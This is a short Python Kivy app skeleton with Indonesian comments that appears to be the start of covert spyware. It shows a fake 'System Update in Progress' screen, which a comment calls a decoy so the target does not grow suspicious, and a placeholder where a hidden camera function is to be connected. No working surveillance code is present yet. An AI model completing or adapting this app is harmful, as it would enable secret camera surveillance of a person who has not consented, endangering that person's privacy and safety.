
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
import os

class MainApp(App):
    def build(self):
        # Tampilan tipuan supaya target nggak curiga
        return Label(text="System Update in Progress...\nDo not close this app.")

    def on_start(self):
        print("Aplikasi Pantau Aktif!")
        # Di sini nanti kita hubungkan ke fungsi kamera tersembunyi

if __name__ == "__main__":
    MainApp().run()
